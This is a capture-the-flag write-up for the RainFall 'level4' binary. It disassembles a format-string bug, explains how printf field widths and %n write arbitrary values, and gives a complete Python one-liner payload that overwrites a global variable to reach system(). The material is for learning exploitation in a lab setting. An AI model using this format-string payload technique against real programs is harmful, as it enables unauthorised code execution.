# level4

Nothing better than an `objdump` to get an overview with what we are dealing with.
```
level4@RainFall:~$ objdump -Mintel -d level4

level4:     file format elf32-i386


Disassembly of section .init:
...
08048444 <p>:
 8048444:	55                   	push   ebp
 8048445:	89 e5                	mov    ebp,esp
 8048447:	83 ec 18             	sub    esp,0x18
 804844a:	8b 45 08             	mov    eax,DWORD PTR [ebp+0x8]
 804844d:	89 04 24             	mov    DWORD PTR [esp],eax
 8048450:	e8 eb fe ff ff       	call   8048340 <printf@plt>
 8048455:	c9                   	leave  
 8048456:	c3                   	ret    

08048457 <n>:
 8048457:	55                   	push   ebp
 8048458:	89 e5                	mov    ebp,esp
 804845a:	81 ec 18 02 00 00    	sub    esp,0x218
 8048460:	a1 04 98 04 08       	mov    eax,ds:0x8049804
 8048465:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
 8048469:	c7 44 24 04 00 02 00 	mov    DWORD PTR [esp+0x4],0x200
 8048470:	00 
 8048471:	8d 85 f8 fd ff ff    	lea    eax,[ebp-0x208]
 8048477:	89 04 24             	mov    DWORD PTR [esp],eax
 804847a:	e8 d1 fe ff ff       	call   8048350 <fgets@plt>
 804847f:	8d 85 f8 fd ff ff    	lea    eax,[ebp-0x208]
 8048485:	89 04 24             	mov    DWORD PTR [esp],eax
 8048488:	e8 b7 ff ff ff       	call   8048444 <p>
 804848d:	a1 10 98 04 08       	mov    eax,ds:0x8049810
 8048492:	3d 44 55 02 01       	cmp    eax,0x1025544
 8048497:	75 0c                	jne    80484a5 <n+0x4e>
 8048499:	c7 04 24 90 85 04 08 	mov    DWORD PTR [esp],0x8048590
 80484a0:	e8 bb fe ff ff       	call   8048360 <system@plt>
 80484a5:	c9                   	leave  
 80484a6:	c3                   	ret    

080484a7 <main>:
 80484a7:	55                   	push   ebp
 80484a8:	89 e5                	mov    ebp,esp
 80484aa:	83 e4 f0             	and    esp,0xfffffff0
 80484ad:	e8 a5 ff ff ff       	call   8048457 <n>
 80484b2:	c9                   	leave  
 80484b3:	c3                   	ret    
 80484b4:	90                   	nop
 80484b5:	90                   	nop
 80484b6:	90                   	nop
 80484b7:	90                   	nop
 80484b8:	90                   	nop
 80484b9:	90                   	nop
 80484ba:	90                   	nop
 80484bb:	90                   	nop
 80484bc:	90                   	nop
 80484bd:	90                   	nop
 80484be:	90                   	nop
 80484bf:	90                   	nop
 ...
```

This is the same vulnerability as `level3`. However, a few things changes :

- Now the `printf` call is made in another function `p`. This would only add a couple of words into the stack : `p` sole argument, saved `eip`, saved `ebp`, `printf`'s sole argument...
- The value from the address stored at `0x8049810` is now compared to a much bigger immediate value, `0x1025544`.

Because of the buffer size, our format string is limited to 0x200 bytes. Remember that `%n` writes the number of characters processed so far by the format function.
If we use the same `%n` specifier to write at arbitrary address, we would be quickly limited by our buffer being only 512 bytes. However, the **size of the format string is not the only way to influence how may characters the format function will write**.

From `man 3 printf` :

>   Field width : an  optional decimal digit string (with nonzero first digit) specifying a minimum field width.  If the converted value has fewer characters than the field width, it will be padded with spaces on the left (or right, if the left-adjustment flag has been given).  

The following format string `%29371x` is ony **7** bytes but will yield to **29371** bytes being written because of the *field width*.

By dumping the stack, we notice that the buffer starts on the 12th machine words :

```bash
level4@RainFall:~$ python -c 'print("%08x."*12)' | ./level4
b7ff26b0.bffff794.b7fd0ff4.00000000.00000000.bffff758.0804848d.bffff550.00000200.b7fd1ac0.b7ff37d0.78383025.
```

The address we need to set to `0x1025544` is `0x8049810`. In other words, we need `printf` to have processed **16930116** bytes when the function will encounter the `%n` specifier.

The beginning of our buffer will be filled with the address `0x8049810`. Then, we advance `printf`'s internal pointer by 10 words, using `%08x` specifiers.

```
python -c 'print("\x10\x98\x04\x08" + "%08x"*10 + "%016930032x" + "%n")' | ./level4
```